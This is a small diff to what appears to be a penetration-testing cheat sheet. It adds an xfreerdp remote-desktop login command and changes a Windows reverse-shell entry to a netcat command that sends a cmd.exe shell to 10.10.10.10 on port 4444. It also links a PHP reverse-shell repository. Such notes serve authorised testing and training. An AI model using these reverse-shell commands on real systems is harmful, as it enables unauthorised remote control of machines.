@@ -215,7 +215,8 @@ Pivoting
 
 Remote Desktop
 ----------------
-rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
+- rdesktop -u user -p password 10.10.10.10 -g 85% -r disk:share=/root/
+- xfreerdp /d:xyz.local /u:username /p:password /v:10.10.10.10 /cert-ignore
 
 Responder
 ----------------
@@ -229,7 +230,7 @@ Reverse Shells
 
 #Windows
 - https://github.com/Dhayalanb/windows-php-reverse-shell
-- nc [YourIPaddr] [port] –e cmd.exe
+- nc 10.10.10.10 4444 –e cmd.exe
 
 Shell Upgrading
 ----------------
